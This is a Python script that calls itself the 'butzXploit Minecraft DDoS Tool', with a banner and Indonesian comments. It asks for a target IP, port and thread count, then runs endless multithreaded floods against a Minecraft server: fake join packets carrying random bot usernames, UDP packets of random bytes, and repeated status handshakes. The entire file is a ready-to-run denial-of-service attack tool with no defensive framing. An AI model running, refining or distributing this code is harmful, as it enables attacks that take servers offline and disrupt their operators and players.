# butzXploit Minecraft DDoS Tool - BRUTAL EDITION
import socket, threading, random, time
import os

# Tampilan by butzXploit
os.system('clear')
print("""\033[1;31m
██████╗ ██╗   ██╗████████╗███████╗██╗  ██╗██╗     ██╗██████╗ 
██╔══██╗██║   ██║╚══██╔══╝██╔════╝██║  ██║██║     ██║██╔══██╗
██████╔╝██║   ██║   ██║   ███████╗███████║██║     ██║██████╔╝
██╔═══╝ ██║   ██║   ██║   ╚════██║██╔══██║██║     ██║██╔═══╝ 
██║     ╚██████╔╝   ██║   ███████║██║  ██║███████╗██║██║     
╚═╝      ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝     
             Minecraft Server FLOOD by butzXploit
""")

target = input("\033[1;32m[?] Target IP Minecraft: \033[0m")
port = int(input("\033[1;32m[?] Port (25565 Java / 19132 Bedrock): \033[0m"))
mode = input("\033[1;32m[?] Mode (join / ping / motd): \033[0m").lower()
threads = int(input("\033[1;32m[?] Threads: \033[0m"))
delay = float(input("\033[1;32m[?] Delay (detik): \033[0m"))

def rand_username():
    return "butzX_" + ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=5))

def join_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            username = rand_username()
            packet = b'\x00' + bytes([len(username)]) + username.encode()
            s.sendall(packet)
            print(f"\033[1;36m[JOIN] Sent bot {username} to {target}:{port}\033[0m")
            s.close()
            time.sleep(delay)
        except Exception as e:
            print(f"\033[1;31m[ERROR JOIN] {e}\033[0m")
            time.sleep(delay)

def ping_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            msg = random._urandom(1024)
            s.sendto(msg, (target, port))
            print(f"\033[1;34m[PING] Flood to {target}:{port}\033[0m")
            time.sleep(delay)
        except Exception as e:
            print(f"\033[1;31m[ERROR PING] {e}\033[0m")
            time.sleep(delay)

def motd_spam():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            handshake = b'\x00\x00\x09\x00' + bytes([len(target)]) + target.encode() + bytes([port >> 8, port & 0xFF]) + b'\x01'
            request = b'\x01\x00'
            s.sendall(handshake)
            s.sendall(request)
            print(f"\033[1;35m[MOTD] Spam MOTD request to {target}:{port}\033[0m")
            s.close()
            time.sleep(delay)
        except Exception as e:
            print(f"\033[1;31m[ERROR MOTD] {e}\033[0m")
            time.sleep(delay)

# Eksekusi
for i in range(threads):
    if mode == "join":
        threading.Thread(target=join_flood).start()
    elif mode == "ping":
        threading.Thread(target=ping_flood).start()
    elif mode == "motd":
        threading.Thread(target=motd_spam).start()
    else:
        print("\033[1;31m[!] Mode tidak dikenali! Gunakan join / ping / motd\033[0m")
        break
